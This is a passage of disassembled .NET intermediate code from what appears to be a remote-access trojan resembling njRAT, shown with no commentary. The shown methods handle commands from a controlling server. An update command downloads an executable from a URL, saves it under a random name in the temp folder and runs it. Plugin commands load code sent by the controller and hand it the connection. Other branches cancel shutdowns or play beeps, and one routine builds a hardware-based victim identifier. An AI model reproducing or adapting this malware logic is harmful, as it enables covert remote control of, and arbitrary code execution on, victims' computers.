        IL_238e:  call       bool j.OK::Send(string)
        IL_2393:  pop
        IL_2394:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2399:  leave      IL_266b

      }  // end handler
      IL_239e:  ldstr      "cmd /c shutdown -a"
      IL_23a3:  ldc.i4.0
      IL_23a4:  ldc.i4.1
      IL_23a5:  ldc.i4     0x1388
      IL_23aa:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_23af:  pop
      IL_23b0:  br         IL_266b

      IL_23b5:  ldc.i4     0x105
      IL_23ba:  ldc.i4     0x96
      IL_23bf:  call       void j.OK::Beep(int32,
                                           int32)
      IL_23c4:  br         IL_266b

      IL_23c9:  ldc.i4     0x125
      IL_23ce:  ldc.i4     0x96
      IL_23d3:  call       void j.OK::Beep(int32,
                                           int32)
      IL_23d8:  br         IL_266b

      IL_23dd:  ldc.i4     0x149
      IL_23e2:  ldc.i4     0x96
      IL_23e7:  call       void j.OK::Beep(int32,
                                           int32)
      IL_23ec:  br         IL_266b

      IL_23f1:  ldc.i4     0x15d
      IL_23f6:  ldc.i4     0x96
      IL_23fb:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2400:  br         IL_266b

      IL_2405:  ldc.i4     0x115
      IL_240a:  ldc.i4     0x96
      IL_240f:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2414:  br         IL_266b

      IL_2419:  ldc.i4     0x137
      IL_241e:  ldc.i4     0x96
      IL_2423:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2428:  br         IL_266b

      IL_242d:  ldc.i4     0x171
      IL_2432:  ldc.i4     0x96
      IL_2437:  call       void j.OK::Beep(int32,
                                           int32)
      IL_243c:  br         IL_266b

      IL_2441:  ldc.i4     0x187
      IL_2446:  ldc.i4     0x96
      IL_244b:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2450:  br         IL_266b

      IL_2455:  ldc.i4     0x19f
      IL_245a:  ldc.i4     0x96
      IL_245f:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2464:  br         IL_266b

      IL_2469:  ldc.i4     0x1b8
      IL_246e:  ldc.i4     0x96
      IL_2473:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2478:  br         IL_266b

      IL_247d:  ldc.i4     0x1be
      IL_2482:  ldc.i4     0x96
      IL_2487:  call       void j.OK::Beep(int32,
                                           int32)
      IL_248c:  br         IL_266b

      IL_2491:  ldc.i4     0x1ed
      IL_2496:  ldc.i4     0x96
      IL_249b:  call       void j.OK::Beep(int32,
                                           int32)
      IL_24a0:  br         IL_266b

      IL_24a5:  ldc.i4     0x20b
      IL_24aa:  ldc.i4     0x96
      IL_24af:  call       void j.OK::Beep(int32,
                                           int32)
      IL_24b4:  br         IL_266b

      IL_24b9:  ldc.i4     0x22a
      IL_24be:  ldc.i4     0x96
      IL_24c3:  call       void j.OK::Beep(int32,
                                           int32)
      IL_24c8:  br         IL_266b

      IL_24cd:  ldc.i4     0x24b
      IL_24d2:  ldc.i4     0x96
      IL_24d7:  call       void j.OK::Beep(int32,
                                           int32)
      IL_24dc:  br         IL_266b

      IL_24e1:  ldc.i4     0x26e
      IL_24e6:  ldc.i4     0x96
      IL_24eb:  call       void j.OK::Beep(int32,
                                           int32)
      IL_24f0:  br         IL_266b

      IL_24f5:  ldc.i4     0x293
      IL_24fa:  ldc.i4     0x96
      IL_24ff:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2504:  br         IL_266b

      IL_2509:  ldc.i4     0x2ba
      IL_250e:  ldc.i4     0x96
      IL_2513:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2518:  br         IL_266b

      IL_251d:  ldc.i4     0x2e3
      IL_2522:  ldc.i4     0x96
      IL_2527:  call       void j.OK::Beep(int32,
                                           int32)
      IL_252c:  br         IL_266b

      IL_2531:  ldc.i4     0x30f
      IL_2536:  ldc.i4     0x96
      IL_253b:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2540:  br         IL_266b

      IL_2545:  ldc.i4     0x33e
      IL_254a:  ldc.i4     0x96
      IL_254f:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2554:  br         IL_266b

      IL_2559:  ldc.i4     0x370
      IL_255e:  ldc.i4     0x96
      IL_2563:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2568:  br         IL_266b

      IL_256d:  ldc.i4     0x3a4
      IL_2572:  ldc.i4     0x96
      IL_2577:  call       void j.OK::Beep(int32,
                                           int32)
      IL_257c:  br         IL_266b

      IL_2581:  ldc.i4     0x3db
      IL_2586:  ldc.i4     0x96
      IL_258b:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2590:  br         IL_266b

      IL_2595:  ldc.i4     0xf6
      IL_259a:  ldc.i4     0x96
      IL_259f:  call       void j.OK::Beep(int32,
                                           int32)
      IL_25a4:  br         IL_266b

      IL_25a9:  ldc.i4     0xe9
      IL_25ae:  ldc.i4     0x96
      IL_25b3:  call       void j.OK::Beep(int32,
                                           int32)
      IL_25b8:  br         IL_266b

      IL_25bd:  ldc.i4     0xdc
      IL_25c2:  ldc.i4     0x96
      IL_25c7:  call       void j.OK::Beep(int32,
                                           int32)
      IL_25cc:  br         IL_266b

      IL_25d1:  ldc.i4     0xcf
      IL_25d6:  ldc.i4     0x96
      IL_25db:  call       void j.OK::Beep(int32,
                                           int32)
      IL_25e0:  br         IL_266b

      IL_25e5:  ldc.i4     0xc3
      IL_25ea:  ldc.i4     0x96
      IL_25ef:  call       void j.OK::Beep(int32,
                                           int32)
      IL_25f4:  br.s       IL_266b

      IL_25f6:  ldc.i4     0xb8
      IL_25fb:  ldc.i4     0x96
      IL_2600:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2605:  br.s       IL_266b

      IL_2607:  ldc.i4     0xae
      IL_260c:  ldc.i4     0x96
      IL_2611:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2616:  br.s       IL_266b

      IL_2618:  ldc.i4     0xa4
      IL_261d:  ldc.i4     0x96
      IL_2622:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2627:  br.s       IL_266b

      IL_2629:  ldc.i4     0x9b
      IL_262e:  ldc.i4     0x96
      IL_2633:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2638:  br.s       IL_266b

      IL_263a:  ldc.i4     0x92
      IL_263f:  ldc.i4     0x96
      IL_2644:  call       void j.OK::Beep(int32,
                                           int32)
      IL_2649:  br.s       IL_266b

      IL_264b:  ldc.i4     0x8a
      IL_2650:  ldc.i4     0x96
      IL_2655:  call       void j.OK::Beep(int32,
                                           int32)
      IL_265a:  br.s       IL_266b

      IL_265c:  ldc.i4     0x82
      IL_2661:  ldc.i4     0x96
      IL_2666:  call       void j.OK::Beep(int32,
                                           int32)
      IL_266b:  leave      IL_2a86

      IL_2670:  ldloc.2
      IL_2671:  ldstr      "up"
      IL_2676:  ldc.i4.0
      IL_2677:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_267c:  brtrue     IL_283e

      IL_2681:  ldnull
      IL_2682:  stloc.s    V_5
      IL_2684:  ldloc.0
      IL_2685:  ldc.i4.1
      IL_2686:  ldelem.ref
      IL_2687:  ldc.i4.0
      IL_2688:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_268d:  ldc.i4.s   31
      IL_268f:  bne.un.s   IL_270d

      .try
      {
        IL_2691:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_2696:  ldloc.0
        IL_2697:  ldc.i4.0
        IL_2698:  ldelem.ref
        IL_2699:  ldsfld     string j.OK::Y
        IL_269e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_26a3:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_26a8:  stloc.s    V_62
        IL_26aa:  dup
        IL_26ab:  ldarg.0
        IL_26ac:  ldloc.s    V_62
        IL_26ae:  ldarg.0
        IL_26af:  ldlen
        IL_26b0:  conv.i4
        IL_26b1:  ldloc.s    V_62
        IL_26b3:  sub.ovf
        IL_26b4:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_26b9:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_26be:  call       uint8[] j.OK::ZIP(uint8[])
        IL_26c3:  stloc.s    V_5
        IL_26c5:  leave      IL_2765

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_26ca:  dup
        IL_26cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_26d0:  stloc.s    V_63
        IL_26d2:  ldloc.s    V_63
        IL_26d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_26d9:  ldstr      "MSG"
        IL_26de:  ldsfld     string j.OK::Y
        IL_26e3:  ldstr      "Update ERROR"
        IL_26e8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_26ed:  call       bool j.OK::Send(string)
        IL_26f2:  pop
        IL_26f3:  ldstr      "bla"
        IL_26f8:  call       bool j.OK::Send(string)
        IL_26fd:  pop
        IL_26fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2703:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2708:  leave      IL_2a86

      }  // end handler
      IL_270d:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_2712:  stloc.s    V_6
      .try
      {
        IL_2714:  ldloc.s    V_6
        IL_2716:  ldloc.0
        IL_2717:  ldc.i4.1
        IL_2718:  ldelem.ref
        IL_2719:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_271e:  stloc.s    V_5
        IL_2720:  leave.s    IL_2765

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2722:  dup
        IL_2723:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2728:  stloc.s    V_64
        IL_272a:  ldloc.s    V_64
        IL_272c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2731:  ldstr      "MSG"
        IL_2736:  ldsfld     string j.OK::Y
        IL_273b:  ldstr      "Update ERROR"
        IL_2740:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2745:  call       bool j.OK::Send(string)
        IL_274a:  pop
        IL_274b:  ldstr      "bla"
        IL_2750:  call       bool j.OK::Send(string)
        IL_2755:  pop
        IL_2756:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_275b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2760:  leave      IL_2a86

      }  // end handler
      IL_2765:  ldstr      "bla"
      IL_276a:  call       bool j.OK::Send(string)
      IL_276f:  pop
      IL_2770:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
      IL_2775:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_277a:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_277f:  stloc.s    V_14
      IL_2781:  ldloca.s   V_14
      IL_2783:  constrained. [mscorlib]System.Guid
      IL_2789:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_278e:  ldstr      "-"
      IL_2793:  ldstr      ""
      IL_2798:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_279d:  ldstr      ".exe"
      IL_27a2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_27a7:  stloc.s    V_7
      .try
      {
        IL_27a9:  ldstr      "MSG"
        IL_27ae:  ldsfld     string j.OK::Y
        IL_27b3:  ldstr      "Updating To "
        IL_27b8:  ldloc.s    V_7
        IL_27ba:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_27bf:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_27c4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_27c9:  call       bool j.OK::Send(string)
        IL_27ce:  pop
        IL_27cf:  ldc.i4     0x7d0
        IL_27d4:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_27d9:  ldloc.s    V_7
        IL_27db:  ldloc.s    V_5
        IL_27dd:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_27e2:  ldloc.s    V_7
        IL_27e4:  ldstr      ".."
        IL_27e9:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_27ee:  pop
        IL_27ef:  leave.s    IL_2834

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_27f1:  dup
        IL_27f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_27f7:  stloc.s    V_65
        IL_27f9:  ldloc.s    V_65
        IL_27fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2800:  ldloc.s    V_65
        IL_2802:  stloc.s    V_66
        IL_2804:  ldstr      "MSG"
        IL_2809:  ldsfld     string j.OK::Y
        IL_280e:  ldstr      "Update ERROR "
        IL_2813:  ldloc.s    V_66
        IL_2815:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_281a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_281f:  call       bool j.OK::Send(string)
        IL_2824:  pop
        IL_2825:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_282a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_282f:  leave      IL_2a86

      }  // end handler
      IL_2834:  call       void j.OK::UNS()
      IL_2839:  leave      IL_2a86

      IL_283e:  ldloc.2
      IL_283f:  ldstr      "Ex"
      IL_2844:  ldc.i4.0
      IL_2845:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_284a:  brtrue     IL_290f

      IL_284f:  ldsfld     object j.OK::PLG
      IL_2854:  brtrue.s   IL_28a8

      IL_2856:  ldstr      "PLG"
      IL_285b:  call       bool j.OK::Send(string)
      IL_2860:  pop
      IL_2861:  ldc.i4.0
      IL_2862:  stloc.s    V_69
      IL_2864:  br.s       IL_2876

      IL_2866:  ldloc.s    V_69
      IL_2868:  ldc.i4.1
      IL_2869:  add.ovf
      IL_286a:  stloc.s    V_69
      IL_286c:  ldc.i4     0x3e8
      IL_2871:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_2876:  ldsfld     object j.OK::PLG
      IL_287b:  ldnull
      IL_287c:  cgt.un
      IL_287e:  ldloc.s    V_69
      IL_2880:  ldc.i4.s   20
      IL_2882:  ceq
      IL_2884:  or
      IL_2885:  ldsfld     bool j.OK::Cn
      IL_288a:  ldc.i4.0
      IL_288b:  ceq
      IL_288d:  or
      IL_288e:  brfalse.s  IL_2866

      IL_2890:  ldsfld     object j.OK::PLG
      IL_2895:  ldnull
      IL_2896:  ceq
      IL_2898:  ldsfld     bool j.OK::Cn
      IL_289d:  ldc.i4.0
      IL_289e:  ceq
      IL_28a0:  or
      IL_28a1:  brfalse.s  IL_28a8

      IL_28a3:  leave      IL_2a86

      IL_28a8:  ldc.i4.1
      IL_28a9:  newarr     [mscorlib]System.Object
      IL_28ae:  dup
      IL_28af:  ldc.i4.0
      IL_28b0:  ldarg.0
      IL_28b1:  stelem.ref
      IL_28b2:  stloc.s    V_67
      IL_28b4:  ldc.i4.1
      IL_28b5:  newarr     [mscorlib]System.Boolean
      IL_28ba:  dup
      IL_28bb:  ldc.i4.0
      IL_28bc:  ldc.i4.1
      IL_28bd:  stelem.i1
      IL_28be:  stloc.s    V_68
      IL_28c0:  ldsfld     object j.OK::PLG
      IL_28c5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_28ca:  ldnull
      IL_28cb:  ldstr      "ind"
      IL_28d0:  ldloc.s    V_67
      IL_28d2:  ldnull
      IL_28d3:  ldnull
      IL_28d4:  ldloc.s    V_68
      IL_28d6:  ldc.i4.1
      IL_28d7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_28dc:  pop
      IL_28dd:  ldloc.s    V_68
      IL_28df:  ldc.i4.0
      IL_28e0:  ldelem.u1
      IL_28e1:  brfalse    IL_29da

      IL_28e6:  ldloc.s    V_67
      IL_28e8:  ldc.i4.0
      IL_28e9:  ldelem.ref
      IL_28ea:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_28ef:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_28f4:  ldtoken    uint8[]
      IL_28f9:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_28fe:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_2903:  castclass  uint8[]
      IL_2908:  starg.s    b
      IL_290a:  br         IL_29da

      IL_290f:  ldloc.2
      IL_2910:  ldstr      "PLG"
      IL_2915:  ldc.i4.0
      IL_2916:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_291b:  brtrue     IL_29da

      IL_2920:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_2925:  ldloc.0
      IL_2926:  ldc.i4.0
      IL_2927:  ldelem.ref
      IL_2928:  ldsfld     string j.OK::Y
      IL_292d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_2932:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_2937:  stloc.s    V_70
      IL_2939:  dup
      IL_293a:  ldarg.0
      IL_293b:  ldloc.s    V_70
      IL_293d:  ldarg.0
      IL_293e:  ldlen
      IL_293f:  conv.i4
      IL_2940:  ldloc.s    V_70
      IL_2942:  sub.ovf
      IL_2943:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_2948:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_294d:  call       uint8[] j.OK::ZIP(uint8[])
      IL_2952:  ldstr      "A"
      IL_2957:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_295c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2961:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2966:  stsfld     object j.OK::PLG
      IL_296b:  ldsfld     object j.OK::PLG
      IL_2970:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2975:  ldnull
      IL_2976:  ldstr      "H"
      IL_297b:  ldc.i4.1
      IL_297c:  newarr     [mscorlib]System.Object
      IL_2981:  dup
      IL_2982:  ldc.i4.0
      IL_2983:  ldsfld     string j.OK::H
      IL_2988:  stelem.ref
      IL_2989:  ldnull
      IL_298a:  ldnull
      IL_298b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_2990:  ldsfld     object j.OK::PLG
      IL_2995:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_299a:  ldnull
      IL_299b:  ldstr      "P"
      IL_29a0:  ldc.i4.1
      IL_29a1:  newarr     [mscorlib]System.Object
      IL_29a6:  dup
      IL_29a7:  ldc.i4.0
      IL_29a8:  ldsfld     string j.OK::P
      IL_29ad:  stelem.ref
      IL_29ae:  ldnull
      IL_29af:  ldnull
      IL_29b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_29b5:  ldsfld     object j.OK::PLG
      IL_29ba:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_29bf:  ldnull
      IL_29c0:  ldstr      "c"
      IL_29c5:  ldc.i4.1
      IL_29c6:  newarr     [mscorlib]System.Object
      IL_29cb:  dup
      IL_29cc:  ldc.i4.0
      IL_29cd:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_29d2:  stelem.ref
      IL_29d3:  ldnull
      IL_29d4:  ldnull
      IL_29d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_29da:  leave      IL_2a86

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_29df:  dup
      IL_29e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_29e5:  stloc.s    V_71
      IL_29e7:  ldloc.s    V_71
      IL_29e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_29ee:  ldloc.s    V_71
      IL_29f0:  stloc.s    V_72
      IL_29f2:  ldloc.0
      IL_29f3:  ldlen
      IL_29f4:  conv.i4
      IL_29f5:  ldc.i4.0
      IL_29f6:  ble.s      IL_2a23

      IL_29f8:  ldloc.0
      IL_29f9:  ldc.i4.0
      IL_29fa:  ldelem.ref
      IL_29fb:  ldstr      "Ex"
      IL_2a00:  ldc.i4.0
      IL_2a01:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_2a06:  ldc.i4.0
      IL_2a07:  ceq
      IL_2a09:  ldloc.0
      IL_2a0a:  ldc.i4.0
      IL_2a0b:  ldelem.ref
      IL_2a0c:  ldstr      "PLG"
      IL_2a11:  ldc.i4.0
      IL_2a12:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_2a17:  ldc.i4.0
      IL_2a18:  ceq
      IL_2a1a:  or
      IL_2a1b:  brfalse.s  IL_2a23

      IL_2a1d:  ldnull
      IL_2a1e:  stsfld     object j.OK::PLG
      IL_2a23:  nop
      .try
      {
        IL_2a24:  ldc.i4.5
        IL_2a25:  newarr     [mscorlib]System.String
        IL_2a2a:  dup
        IL_2a2b:  ldc.i4.0
        IL_2a2c:  ldstr      "ER"
        IL_2a31:  stelem.ref
        IL_2a32:  dup
        IL_2a33:  ldc.i4.1
        IL_2a34:  ldsfld     string j.OK::Y
        IL_2a39:  stelem.ref
        IL_2a3a:  dup
        IL_2a3b:  ldc.i4.2
        IL_2a3c:  ldloc.0
        IL_2a3d:  ldc.i4.0
        IL_2a3e:  ldelem.ref
        IL_2a3f:  stelem.ref
        IL_2a40:  dup
        IL_2a41:  ldc.i4.3
        IL_2a42:  ldsfld     string j.OK::Y
        IL_2a47:  stelem.ref
        IL_2a48:  dup
        IL_2a49:  ldc.i4.4
        IL_2a4a:  ldloc.s    V_72
        IL_2a4c:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_2a51:  stelem.ref
        IL_2a52:  call       string [mscorlib]System.String::Concat(string[])
        IL_2a57:  call       bool j.OK::Send(string)
        IL_2a5c:  pop
        IL_2a5d:  leave.s    IL_2a7a

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2a5f:  dup
        IL_2a60:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2a65:  stloc.s    V_73
        IL_2a67:  ldloc.s    V_73
        IL_2a69:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2a6e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2a73:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2a78:  leave.s    IL_2a7a

      }  // end handler
      IL_2a7a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_2a7f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_2a84:  leave.s    IL_2a86

    }  // end handler
    IL_2a86:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1056 (0x420)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [mscorlib]System.DateTime V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             string[] V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             string[] V_14,
             int32 V_15,
             class [mscorlib]System.Exception V_16)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string j.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.0
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object j.OK::GTV(string,
                                            object)
      IL_001f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0024:  ldstr      ""
      IL_0029:  ldc.i4.0
      IL_002a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002f:  brfalse.s  IL_0060

      IL_0031:  ldloc.0
      IL_0032:  ldsflda    string j.OK::VN
      IL_0037:  call       string j.OK::DEB(string&)
      IL_003c:  ldstr      "_"
      IL_0041:  call       string j.OK::HWD()
      IL_0046:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004b:  stloc.2
      IL_004c:  ldloca.s   V_2
      IL_004e:  call       string j.OK::ENB(string&)
      IL_0053:  ldsfld     string j.OK::Y
      IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005d:  stloc.0
      IL_005e:  br.s       IL_00a4

      IL_0060:  ldloc.0
      IL_0061:  ldstr      "vn"
      IL_0066:  ldstr      ""
      IL_006b:  call       object j.OK::GTV(string,
                                            object)
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_007a:  stloc.3
      IL_007b:  ldloca.s   V_3
      IL_007d:  call       string j.OK::DEB(string&)
      IL_0082:  ldstr      "_"
      IL_0087:  call       string j.OK::HWD()
      IL_008c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0091:  stloc.2
      IL_0092:  ldloca.s   V_2
      IL_0094:  call       string j.OK::ENB(string&)
      IL_0099:  ldsfld     string j.OK::Y
      IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a3:  stloc.0
      IL_00a4:  leave.s    IL_00da

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a6:  dup
      IL_00a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ac:  stloc.s    V_4
      IL_00ae:  ldloc.s    V_4
      IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b5:  ldloc.0
      IL_00b6:  call       string j.OK::HWD()
      IL_00bb:  stloc.2
      IL_00bc:  ldloca.s   V_2
      IL_00be:  call       string j.OK::ENB(string&)
      IL_00c3:  ldsfld     string j.OK::Y
      IL_00c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00cd:  stloc.0
